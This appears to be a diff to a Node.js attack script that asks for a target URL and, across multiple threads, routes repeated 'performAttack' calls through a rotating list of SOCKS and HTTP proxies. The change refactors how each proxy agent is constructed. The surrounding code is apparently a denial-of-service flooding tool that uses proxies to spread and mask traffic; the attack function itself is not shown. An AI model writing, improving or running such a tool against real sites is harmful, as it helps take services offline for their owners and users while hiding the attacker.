@@ -121,14 +121,13 @@ rl.question("\x1b[36mEnter the target URL (starting with http:// or https://):\x
 
     for (let i = 0; i < numThreads; i++) {
         for (const proxy of proxies) {
-            const [host, port] = proxy.split(":");
-            let agent;
-
-            if (host.startsWith("socks")) {
-                agent = new SocksProxyAgent(`socks5://${host}:${port}`);
-            } else {
-                agent = new HttpsProxyAgent(`http://${host}:${port}`);
-            }
+            const proxyParts = proxy.split(":");
+            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+            const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+            
+            const agent = proxyProtocol === "socks5"
+                ? new SocksProxyAgent(proxyUrl)
+                : new HttpsProxyAgent(proxyUrl);
 
             performAttack(targetUrl, agent, headers, () => (continueAttack = false));
         }
